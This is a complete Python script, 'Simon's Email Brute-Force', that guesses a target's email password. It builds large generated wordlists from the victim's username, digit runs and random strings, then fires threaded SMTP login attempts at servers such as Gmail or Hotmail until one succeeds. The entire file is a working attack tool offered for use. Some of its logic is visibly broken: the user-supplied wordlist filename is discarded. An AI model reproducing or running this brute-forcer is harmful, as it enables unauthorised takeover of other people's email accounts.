import smtplib, threading, random, time, os

found = ""
flag = True
lock = threading.Lock()

def tryh(username, password, addr):
	global found, flag
	for port in [587, 465]:
		try:
			if flag:
				s = smtplib.SMTP(addr, port)
			if flag:
				s.timeout = 1
			if flag:
				s.starttls()
			if flag:
				s.ehlo()
			if flag:
				s.login(username, password)
			with lock:
				found = password
				flag = False
		except:
			pass
def start(username, addr, type, userfile, info):
	global found, flag
	if type == 0:
		if userfile:
			print(f"Loading Password List...")
			try:
				file = open(info, "r")
				passwords = file.read().split("\n")
				file.close()
			except:
				print(f"File error")
				passwords = [""]
		else:
			print(f"Creating Password List...")
			name = username[0:username.find("@")]
			passwords = [username, name]
			for passwd in "12345678 13456789 14567890 0987654321 123567890 111222333 222333444 333444555 444555666 555666777 11111111 22222222 33333333 44444444 55555555 66666666 77777777 88888888 99999999 00000000 1029384756 0192837465 0129834765".split():
				passwords.append(passwd)
			for n in range(0, 10000):
				passwords.append(name+str(n))
				passwords.append(str(n)+name)
			for _ in range(100000):
				passwords.append(str(random.randint(10000000, 99999999)))
				passwd = ""
				for _ in range(random.randint(8, 12)):
					passwd += random.choice("q w e r t y u i o p a s d f g h j k l z x c v b n m 1 2 3 4 5 6 7 8 9 0".split())
				passwords.append(passwd)
			a = "#".join(name).split("#")
			if len(a) >= 8:
				for _ in range(1000):
					random.shuffle(a)
					if "".join(a) in passwords:
						pass
					else:
						passwords.append("".join(a))
	if type == 0:
		print(f"Password Count: {len(passwords)}")
		input("[ Enter to start ]")
		print(f"Started Password Trying...\n")
		for passwd, n in zip(passwords, range(len(passwords))):
			if flag == False:
				break
			y = (n/len(passwords))*100
			print(f"Processing... [{y:.2f}%]({n+1}/{len(passwords)})")
			threading.Thread(target=tryh, args=(username, passwd, addr)).start()
	else:
		threading.Thread(target=tryh, args=(username, info, addr)).start()
	time.sleep(1)
	if flag == False:
		print(f"Password Found! {found}")
	else:
		print(f"Password not founded :(")
	with lock:
		flag = True
		found = ""
	if type == 0:
		input("\n[ Enter to exit ]")

def menu():
	if os.name == "nt":
		os.system("cls")
	else:
		os.system("clear")
	print(f"Simon's Email Brute-Force v1.0.0\n")
	addr = input("Enter Email Server Address (smtp.gmail.com: GMAIL, smtp.live.com: HOTMAIL/LIVE or your choiced server): ")
	type = input("Enter Testing Type (auto/manual): ")
	if type in ["auto", "manual"]:
		pass
	else:
		print(f"Type Changed: auto")
		type = "auto"
	target = input("Enter Target (example@example.com): ")
	if type == "auto":
		list = input("Enter List Choice (0=Code's Password List, 1=YourList): ")
		if list == "1":
			userfile = True
			filename = input("Your File Name: ")
		else:
			userfile = False
		start(target, addr, 0, userfile, "")
	else:
		while True:
			password = input("Password: ")
			start(target, addr, 1, False, password)

menu()
